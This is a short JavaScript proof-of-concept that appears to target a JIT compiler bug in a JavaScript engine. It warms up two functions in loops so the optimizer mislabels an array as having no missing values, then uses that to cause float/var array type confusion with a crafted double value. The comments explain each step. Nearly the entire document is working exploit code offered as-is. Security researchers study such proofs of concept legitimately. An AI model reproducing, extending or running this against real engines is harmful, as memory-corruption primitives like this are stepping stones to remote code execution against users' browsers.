var b = [1.1,2.2,3.3,4.4,5.5,6.6]
var a = [1.1,2.2,3.3,4.4];
a.length = 3;

let arr = [1.1,2.2];

function jit(index){

  let tmp_a = a;
  let tmp_b = b;
  let x = 1;
  for(var j = 0;j < 1;j++){

    tmp_a[2] = 3.3;
    tmp_b[5] = 1.1;
    
    for(var i = 0;i < 3; ++i){
        tmp_b = tmp_a;
        tmp_b[2] = 2.2;
    }
    
    if(index < 0 || index > 4){
        return;
    }
    
    x = tmp_b[index];
  }
  arr[0] = x; // this is not converting arr from var to float array because it thinks x is coming from an array that 
              // doesn't have missing values
}

for(let i = 0;i < 0x10000;i++){
  jit(1);
}
jit(4);

// now arr has a missing value but its flags say that it has no missing values

function jit2(victim, giveMeMissingValue, changeMe){
  let MissingValue = giveMeMissingValue[0]; // this does a BailOnNotArray with a check that the array doesn't have missing values
                                            // and that check is testing the array flags, which are not accurate
  victim[0] = 1.1;
  changeMe[0x100] = MissingValue;   //change float Array to var Array
  victim[0] = 6.17651672645e-312;   //type confusion happen here
}

for(let i = 0;i < 0x20000;i++){
  let farr = [2,3,4,5,6.6,7,8,9];
  delete farr[1];
  jit2(farr, [1.1,2.2], farr);
}

let victim = [1.1,2.2];

jit2(victim, arr, victim);
print(victim[0]);